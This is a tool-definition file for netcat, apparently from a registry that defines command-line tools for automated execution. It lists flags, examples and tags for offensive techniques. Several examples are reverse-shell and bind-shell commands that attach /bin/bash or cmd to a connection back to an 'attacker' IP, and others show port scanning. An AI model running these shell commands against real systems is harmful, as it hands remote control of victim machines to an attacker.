---
id: network-socket-nc
namespace: network:socket:nc
name: nc
description: Netcat - arbitrary TCP/UDP connections and listening
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - network.socket.nc
  - network.socket.connect
  - network.socket.listen
platforms:
  - linux
risk_level: low
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
  - arm64
features:
  - remote
  - network-intensive
techniques:
  - lateral-movement
  - command-and-control
  - credential-access
  - defense-evasion
  - execution
  - persistence
  - privilege-escalation
  - process-manip
parameters:
  - name: flag-c
    type: string
    required: false
    description: "as `-e'; use /bin/sh to exec [dangerous!!]"
    aliases:
      - -c
  - name: flag-e
    type: string
    required: false
    description: "program to exec after connect [dangerous!!]"
    aliases:
      - -e
  - name: flag-b
    type: string
    required: false
    description: "allow broadcasts"
    aliases:
      - -b
  - name: flag-g
    type: string
    required: false
    description: "source-routing hop point[s], up to 8"
    aliases:
      - -g
  - name: flag-G
    template_key: flag-g
    type: string
    required: false
    description: "source-routing pointer: 4, 8, 12"
    aliases:
      - -G
  - name: flag-h
    type: string
    required: false
    description: "this cruft"
    aliases:
      - -h
  - name: flag-i
    type: number
    required: false
    description: "delay interval for lines sent, ports scanned"
    aliases:
      - -i
  - name: flag-k
    type: string
    required: false
    description: "set keepalive option on socket"
    aliases:
      - -k
  - name: flag-l
    type: string
    required: false
    description: "listen mode, for inbound connects"
    aliases:
      - -l
  - name: flag-n
    type: integer
    required: false
    description: "numeric-only IP addresses, no DNS"
    aliases:
      - -n
  - name: flag-o
    type: string
    required: false
    description: "hex dump of traffic"
    aliases:
      - -o
  - name: flag-p
    type: integer
    required: false
    description: "local port number"
    aliases:
      - -p
  - name: flag-r
    type: string
    required: false
    description: "randomize local and remote ports"
    aliases:
      - -r
  - name: flag-q
    type: string
    required: false
    description: "quit after EOF on stdin and delay of secs"
    aliases:
      - -q
  - name: flag-s
    type: string
    required: false
    description: "local source address"
    aliases:
      - -s
  - name: flag-T
    template_key: flag-t
    type: string
    required: false
    description: "set Type Of Service"
    aliases:
      - -T
  - name: flag-t
    type: string
    required: false
    description: "answer TELNET negotiation"
    aliases:
      - -t
  - name: flag-u
    type: string
    required: false
    description: "UDP mode"
    aliases:
      - -u
  - name: flag-v
    type: string
    required: false
    description: "verbose [use twice to be more verbose]"
    aliases:
      - -v
  - name: flag-w
    type: number
    required: false
    description: "timeout for connects and final net reads"
    aliases:
      - -w
  - name: flag-z
    type: string
    required: false
    description: "zero-I/O mode [used for scanning]"
    aliases:
      - -z
execution:
  template: "nc -c {flag-c} -e {flag-e} -b {flag-b} -g {flag-g} -G {flag-g}"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars:
  target: ip
  port: port
examples:
  - description: "Basic usage with flag-c"
    command: "nc ${flag-c}"
  - description: "Display help message"
    command: "nc --help"
  - description: NetRunners revshell/shell
    command: nc.exe {{IP}} {{PORT}} -e cmd
  - description: NetRunners revshell/shell
    command: nc -e /bin/bash {{IP}} {{PORT}}
  - description: Basic client use - connect to a server
    command: nc [hostname] [port]
  - description: Basic server use - listen on a specific port
    command: nc -l -p [port]
  - description: Send a file from a client to a server Server side
    command: nc -l -p [port] > [output-file]
  - description: Client side
    command: nc [hostname] [port] < [input-file]
  - description: Create a simple chat server Server side
    command: nc -l -p [port]
  - description: Client side
    command: nc [hostname] [port]
  - description: Port scanning a host for open ports
    command: nc -zv [hostname] [starting-port]-[ending-port]
  - description: Using UDP instead of TCP
    command: nc -u [hostname] [port]
  - description: Use with a timeout setting
    command: nc -w [timeout-in-seconds] [hostname] [port]
  - description: Listen for connections on multiple interfaces
    command: nc -l -p [port] -k
  - description: Establish a reverse shell (use with caution) Attacker machine - listen
      for incoming connections
    command: nc -l -p [port]
  - description: Victim machine - connect to attacker
    command: nc [attacker-ip] [port] -e /bin/bash
  - description: Start a simple TCP server on a specified port
    command: nc -l -p PORT_NUMBER
  - description: Connect to a TCP server on a specified IP address and port
    command: nc IP_ADDRESS PORT_NUMBER
  - description: Transfer a file from a server to a client On the server side (listening
      and sending the file)
    command: nc -l -p PORT_NUMBER < filename
  - description: On the client side (receiving the file)
    command: nc IP_ADDRESS PORT_NUMBER > filename
  - description: Scan open ports on a target host
    command: nc -zv IP_ADDRESS PORT_RANGE
  - description: Use netcat as a simple chat tool On one machine (listening)
    command: nc -l -p PORT_NUMBER
  - description: On another machine (connecting to the listener)
    command: nc IP_ADDRESS PORT_NUMBER
  - description: Create a reverse shell from a client to a server On the attacker's
      machine (listening)
    command: nc -l -p PORT_NUMBER -e /bin/bash
  - description: On the victim's machine (connecting back to the attacker's machine)
    command: nc IP_ADDRESS PORT_NUMBER -e /bin/bash
  - description: Bind shell on the server side On the server machine (listening and
      attaching a shell)
    command: nc -l -p PORT_NUMBER -e /bin/bash
  - description: On the client machine (connecting to the bind shell)
    command: nc IP_ADDRESS PORT_NUMBER
mitre_ids:
  - T1035
  - T1140
  - T1187
  - T1197
  - T1208
related_tools:
  - network-socket-socat
---

# nc — Netcat - arbitrary TCP/UDP connections and listening

## Overview

`nc` is a command-line utility for netcat - arbitrary tcp/udp connections and listening.

## Usage

```
nc -c {flag-c} -e {flag-e} -b {flag-b} -g {flag-g} -G {flag-g}
```
